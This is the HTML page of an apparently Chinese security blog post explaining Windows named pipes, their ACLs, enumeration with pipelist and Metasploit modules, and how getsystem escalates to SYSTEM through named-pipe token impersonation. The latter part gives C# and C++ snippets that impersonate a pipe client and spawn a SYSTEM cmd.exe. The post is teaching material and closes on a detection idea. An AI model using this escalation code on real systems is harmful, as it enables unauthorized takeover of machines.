@@ -1,0 +1,123 @@
+<!DOCTYPE html><html><head><meta name="generator" content="Hexo 3.8.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="浅析命名管道"><meta name="keywords" content="命名管道"><meta name="author" content="rootrain"><meta name="copyright" content="rootrain"><title>浅析命名管道 | rootrain's Home</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  }
+} </script></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#管道ACL和连接限制"><span class="toc-number">1.</span> <span class="toc-text">管道ACL和连接限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#知识补充"><span class="toc-number">2.</span> <span class="toc-text">知识补充</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RPC（远程调用协议）"><span class="toc-number">2.1.</span> <span class="toc-text">RPC（远程调用协议）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#命名管道扫描枚举：metasploit"><span class="toc-number">3.</span> <span class="toc-text">命名管道扫描枚举：metasploit</span></a></li></ol><li class="toc-item toc-level-1"><a class="toc-link" href="#模拟令牌"><span class="toc-number"></span> <span class="toc-text">模拟令牌</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#小结"><span class="toc-number"></span> <span class="toc-text">小结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考"><span class="toc-number"></span> <span class="toc-text">参考</span></a></li></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">rootrain</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">12</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">8</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">6</span></a></div></div></div><div id="content-outer"><div class="no-bg" id="top-container"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">rootrain's Home</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page" href="/">Home</a><a class="site-page" href="/archives/">Archives</a><a class="site-page" href="/tags/">Tags</a><a class="site-page" href="/categories/">Categories</a></span></div><div id="post-info"><div id="post-title">浅析命名管道</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-02-29</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/内网/">内网</a></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>命名管道是一个命名的，单向或双面管道的管道服务器和一个或多个管道客户端之间的通信。</p>
+<a id="more"></a>
+<p>#简介</p>
+<p><strong>命名管道</strong>是计算机<a href="https://zh.wikipedia.org/wiki/进程间通信" target="_blank" rel="noopener">进程间</a>的一种<a href="https://zh.wikipedia.org/wiki/先進先出" target="_blank" rel="noopener">先进先出</a>通信机制。是<a href="https://zh.wikipedia.org/wiki/类Unix系统" target="_blank" rel="noopener">类Unix系统</a><a href="https://zh.wikipedia.org/wiki/管道_(Unix" target="_blank" rel="noopener">传统管道</a>)的扩展。传统管道属于匿名管道，其生存期不超过创建管道的进程的生存期。但命名管道的生存期可以与操作系统运行期一样长。</p>
+<p>命名管道是一个命名的，单向或双面管道的管道服务器和一个或多个管道客户端之间的通信。命名管道的所有实例共享相同的管道名称，但是每个实例都有其自己的缓冲区和句柄，并提供用于客户端/服务器通信的单独管道。使用实例可使多个管道客户端同时使用相同的命名管道。</p>
+<p>任何进程都可以访问命名管道，但需要进行安全检查，从而使命名管道成为相关或不相关进程之间的简单通信形式。这就意味着所有进程都可以作为服务端或者客户端，从而使对等通信成为可能。</p>
+<p>#命名管道基础</p>
+<p>命名管道可用于提供同一计算机上的进程之间或整个网络上不同计算机上的进程之间的通信。如果服务器服务正在运行，则可以远程访问所有命名管道。如果打算仅在本地使用命名管道，需要拒绝访问NT AUTHORITY \ NETWORK或切换到本地RPC。</p>
+<p>默认情况下，我们无法使用命名管道来控制计算机通信，但是微软提供了很多种 Windows API 函数，例如 ：</p>
+<ul>
+<li>用于实例化命名管道的服务器端函数是 <a href="https://docs.microsoft.com/en-us/windows/desktop/api/Winbase/nf-winbase-createnamedpipea" target="_blank" rel="noopener"><strong>CreateNamedPipe</strong></a></li>
+<li>接受连接的服务器端功能是 <a href="https://msdn.microsoft.com/en-us/library/Aa365146(v=VS.85" target="_blank" rel="noopener"><strong>ConnectNamedPipe</strong></a>.aspx)</li>
+<li>客户端进程通过使用 <a href="https://docs.microsoft.com/windows/desktop/api/fileapi/nf-fileapi-createfilea" target="_blank" rel="noopener"><strong>CreateFile</strong></a> 或 <a href="https://docs.microsoft.com/en-us/windows/desktop/api/Winbase/nf-winbase-callnamedpipea" target="_blank" rel="noopener"><strong>CallNamedPipe</strong> </a>函数连接到命名管道</li>
+</ul>
+<p>##查看命名管道</p>
+<p>命名管道的客户端可以是本地进程（本地访问：\.\pipe\PipeName）或者是远程进程（访问远程：\ServerName\pipe\PipeName）。很好理解，\地址\ pipe \ &lt;管道名称&gt;</p>
+<p>使用powershell查看：Get-ChildItem \\.\pipe\</p>
+<p><img src="/images/浅析命名管道/image-20200202162500990.png" alt></p>
+<p>也可以通过Sysinternals工具包的pipelist.exe列举：</p>
+<p><img src="/images/浅析命名管道/image-20200202163859134.png" alt></p>
+<p>##命名管道和匿名管道</p>
+<ul>
+<li><p><strong>命名管道</strong>：具有特定名称，所有实例共享该名称 </p>
+</li>
+<li><p><strong>匿名管道</strong>：未命名 </p>
+<p>仅用于子进程与其父进程之间的通信 </p>
+<p>始终是本地的，它们不能用于网络通信 </p>
+<p>关闭后即消失，或执行完其中一个（父项或子项）消失</p>
+<p>实际命名的管道具有随机名称</p>
+</li>
+</ul>
+<h2 id="管道ACL和连接限制"><a href="#管道ACL和连接限制" class="headerlink" title="管道ACL和连接限制"></a>管道ACL和连接限制</h2><p>命名管道由Windows NT中的文件系统驱动程序npfs.sys实现，它支持安全描述符</p>
+<ul>
+<li>安全描述符用于控制对命名管道的访问，其标识了该信息是哪个对象的。</li>
+<li>默认情况下，DACL权限设置为每个使用匿名登录的人（空会话）。当一个进程需要访问安全对象，系统就会检查DACL来决定进程的访问权。如果一个对象没有DACL，那么就是说这个对象是任何人都可以拥有完全的访问权限。 </li>
+<li>可以将ACL修改为仅允许特定用户（与文件ACL相同）</li>
+</ul>
+<h2 id="知识补充"><a href="#知识补充" class="headerlink" title="知识补充"></a>知识补充</h2><p>既然说到命名管道，肯定就会牵扯到其他的一些协议，如SMB、RPC。</p>
+<p>命名管道网络通信使用了未加密的SMB协议（端口445）或DCE\RPC（端口135）</p>
+<h3 id="RPC（远程调用协议）"><a href="#RPC（远程调用协议）" class="headerlink" title="RPC（远程调用协议）"></a>RPC（远程调用协议）</h3><p><strong>RPC</strong></p>
+<ul>
+<li>一种协议，允许一个程序从程序中调用位于另一台计算机上服务</li>
+<li>无需了解网络的结构、细节</li>
+<li>使用135端口（ TCP或UDP）</li>
+</ul>
+<p><strong>DCE / RPC</strong></p>
+<ul>
+<li>这套系统可以让<a href="https://zh.wikipedia.org/wiki/分散式運算" target="_blank" rel="noopener">分散式运算</a>软件能够调用远端系统的资源。一种用于在远程上调用过程的功能，就好像它是本地过程一样呼叫</li>
+</ul>
+<p>###SMB</p>
+<ul>
+<li><p>提供共享的应用层网络协议。访问文件，打印机，串行端口等。</p>
+</li>
+<li><p>常见的访问文件方法</p>
+<p>\\192.168.1.1\c$\flag.txt</p>
+</li>
+<li><p>还提供经过身份验证的进程间沟通机制</p>
+</li>
+<li><p>使用445端口（TCP）</p>
+</li>
+</ul>
+<p>#命名管道枚举和扫描</p>
+<p>命名管道可以通过工具进行枚举或者扫描</p>
+<p>##命名管道列举：pipelist</p>
+<p>Download:<a href="https://download.sysinternals.com/files/PipeList.zip" target="_blank" rel="noopener">https://download.sysinternals.com/files/PipeList.zip</a></p>
+<p><img src="/images/浅析命名管道/image-20200202194940340.png" alt></p>
+<h2 id="命名管道扫描枚举：metasploit"><a href="#命名管道扫描枚举：metasploit" class="headerlink" title="命名管道扫描枚举：metasploit"></a>命名管道扫描枚举：metasploit</h2><p>msf中有两个模块可对命名管道的扫描：SMB (Pipe_Auditor) 和RPC (Pipe_dcerpc_auditor)</p>
+<p><img src="/images/浅析命名管道/image-20200202200224957.png" alt></p>
+<p>在wordlists中还可增加命名管道名</p>
+<p>结合ms17010模块，还可以做一定程度的利用，或许能用枚举出的命名管道进行攻击</p>
+<p><img src="/images/浅析命名管道/image-20200202201113791.png" alt></p>
+<h1 id="模拟令牌"><a href="#模拟令牌" class="headerlink" title="模拟令牌"></a>模拟令牌</h1><p>##基本原理</p>
+<p>命名管道还有一种常用的操作，就是通过模拟令牌，达到提权的目的。</p>
+<p>大家都用过msf里面的getsystem命令，其中就有一个模块支持通过模拟令牌从本地管理员权限提升到system权限。</p>
+<p><img src="/images/浅析命名管道/image-20200203164628917.png" alt></p>
+<p>我们首先需要了解如何模拟另一个用户。模拟是Windows提供的一种方法，在该方法中，进程可以模拟另一个用户的安全内容。例如，如果FTP服务器的进程允许用户进行身份验证，并且只希望允许访问特定用户拥有的文件，则该进程可以模拟该用户帐户并允许Windows强制实施。</p>
+<p>Windows提供了这样的API，ImpersonateNamedPipeClient API调用是getsystem模块功能的关键。</p>
+<p>ImpersonateNamedPipeClient允许命名管道模拟客户端的服务器端。调用此函数时，命名管道文件系统会更改调用进程的线程，以开始模拟从管道读取的最后一条消息的安全内容。只有管道的服务器端可以调用此函数。</p>
+<p>例如，如果属于“受害者”的进程连接并写入属于“攻击者”的命名管道，则攻击者可以调用ImpersonateNamedPipeClient模拟“受害者”的令牌，从而模拟该用户。进程必须拥有SeImpersonatePrivilege特权（身份验证后模拟客户端）。</p>
+<p>默认情况下，此特权仅对许多高特权用户可用</p>
+<p><img src="/images/浅析命名管道/image-20200203154800824.png" alt></p>
+<p>getsystem工作方式：</p>
+<ol>
+<li>首先getsystem会创建一个新的windows服务，并以local system权限运行，在启动时连接到命名管道。</li>
+<li>getsystem再产生一个进程，该进程创建一个命名管道并等待服务的连接。</li>
+<li>Windows服务启动并连接到产生的进程的命名管道。</li>
+<li>进程接收连接，并调用ImpersonateNamedPipeClient，通过模拟令牌获取system权限。</li>
+</ol>
+<p>##代码剖析</p>
+<p>结合代码看一下具体是怎么实现的</p>
+<p>1.首先打包一个windows服务，代码为发送任意字符到（待命中的）命名管道。这是一个windows服务安装程序，该程序安装后便会启动服务执行命令。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public void start(string pipe)</span><br><span class="line">        &#123;</span><br><span class="line">            System.IO.Pipes.NamedPipeClientStream client = new System.IO.Pipes.NamedPipeClientStream(&quot;.&quot;, pipe, System.IO.Pipes.PipeDirection.Out, System.IO.Pipes.PipeOptions.None, System.Security.Principal.TokenImpersonationLevel.Delegation);</span><br><span class="line">            client.Connect();</span><br><span class="line"></span><br><span class="line">            // Write some data (doesn&apos;t matter what)</span><br><span class="line">            client.Write(new byte[] &#123; 0x40, 0x5f, 0x78, 0x70, 0x6e, 0x5f &#125;, 0, 6);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<p>2.新的进程，通过该进程创建一个命名管道等待连接。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建命名管道</span></span><br><span class="line">HANDLE namedPipe = CreateNamedPipeA(PIPE_PATH, </span><br><span class="line">		PIPE_ACCESS_DUPLEX, </span><br><span class="line">		PIPE_TYPE_MESSAGE | PIPE_WAIT, </span><br><span class="line">		PIPE_UNLIMITED_INSTANCES, </span><br><span class="line">		<span class="number">1024</span>, </span><br><span class="line">		<span class="number">1024</span>, </span><br><span class="line">		<span class="number">0</span>, </span><br><span class="line">		<span class="literal">NULL</span></span><br><span class="line">		);</span><br></pre></td></tr></table></figure>
+<p>3.使用新进程安装之前打包好的windows服务安装程序，建立连接</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//安装服务</span></span><br><span class="line">GetModuleFileNameA(LoadLibraryA(SERVICE_EXE), servicePath, <span class="keyword">sizeof</span>(servicePath));</span><br></pre></td></tr></table></figure>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//建立连接</span></span><br><span class="line">connected = ConnectNamedPipe(namedPipe, <span class="literal">NULL</span>) ? TRUE : (GetLastError() == ERROR_PIPE_CONNECTED);</span><br></pre></td></tr></table></figure>
+<p>4.使用API模拟令牌，派生一个system shell</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ImpersonateNamedPipeClient(namedPipe) == <span class="number">0</span>) &#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"[!] Error impersonating client\n"</span>);</span><br><span class="line">				<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">			&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!CreateProcessAsUserA(newtoken, <span class="literal">NULL</span>, <span class="string">"cmd.exe"</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, TRUE, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi)) &#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"[!] CreateProcessAsUser failed (%d), trying another method.\n"</span>, GetLastError());</span><br><span class="line"></span><br><span class="line">				ZeroMemory(&amp;si, <span class="keyword">sizeof</span>(si));</span><br><span class="line">				si.cb = <span class="keyword">sizeof</span>(si);</span><br><span class="line">				ZeroMemory(&amp;pi, <span class="keyword">sizeof</span>(pi));</span><br><span class="line"></span><br><span class="line">				<span class="comment">// Sometimes we fail above (as shown at meterpreter/source/extensions/stdapi/server/sys/process/process.c)</span></span><br><span class="line">				<span class="keyword">if</span> (!CreateProcessWithTokenW(newtoken, LOGON_NETCREDENTIALS_ONLY, <span class="literal">NULL</span>, <span class="string">L"cmd.exe"</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPSTARTUPINFOW)&amp;si, &amp;pi)) &#123;</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">"[!] CreateProcessWithToken failed (%d).\n"</span>, GetLastError());</span><br><span class="line">					<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/images/浅析命名管道/image-20200203163250149.png" alt></p>
+<p><img src="/images/浅析命名管道/image-20200203163646742.png" alt></p>
+<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>通过学习到模拟令牌的权限提升，对蓝队也有一个有趣的思考，如何区分、判断一个进程的父进程与子进程权限是否一致，或许这也是一个不错的拦截黑客的想法。</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation#token-impersonation" target="_blank" rel="noopener">https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation#token-impersonation</a></p>
+<p><a href="https://rcoil.me/2019/11/[知识回顾]命名管道/" target="_blank" rel="noopener">https://rcoil.me/2019/11/%E3%80%90%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE%E3%80%91%E5%91%BD%E5%90%8D%E7%AE%A1%E9%81%93/</a></p>
+<p><a href="https://www.anquanke.com/post/id/190207#h2-0" target="_blank" rel="noopener">https://www.anquanke.com/post/id/190207#h2-0</a></p>
+<p><a href="https://decoder.cloud/2019/03/06/windows-named-pipes-impersonation/" target="_blank" rel="noopener">https://decoder.cloud/2019/03/06/windows-named-pipes-impersonation/</a></p>
+<p><a href="https://docs.microsoft.com/zh-cn/windows/win32/ipc/named-pipes" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/windows/win32/ipc/named-pipes</a></p>
+<p><a href="https://blog.xpnsec.com/becoming-system/" target="_blank" rel="noopener">https://blog.xpnsec.com/becoming-system/</a></p>
+<p><a href="https://securityintelligence.com/identifying-named-pipe-impersonation-and-other-malicious-privilege-escalation-techniques/" target="_blank" rel="noopener">https://securityintelligence.com/identifying-named-pipe-impersonation-and-other-malicious-privilege-escalation-techniques/</a></p>
+</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">rootrain</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://rootrain.me/2020/02/29/浅析命名管道/">https://rootrain.me/2020/02/29/浅析命名管道/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/命名管道/">命名管道</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2020/02/29/内网防御规避(一)-使用blockdlls保护你的代码/"><i class="fa fa-chevron-left">  </i><span>内网防御规避(一)-使用blockdlls保护你的代码</span></a></div><div class="next-post pull-right"><a href="/2020/02/29/使用.NET实现DLL注入技术/"><span>使用.NET实现DLL注入技术</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2019 - 2020 By rootrain</div><div class="framework-info"></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
+  $('#nav').addClass('is-mobile')
+  $('footer').addClass('is-mobile')
+}</script></body></html>
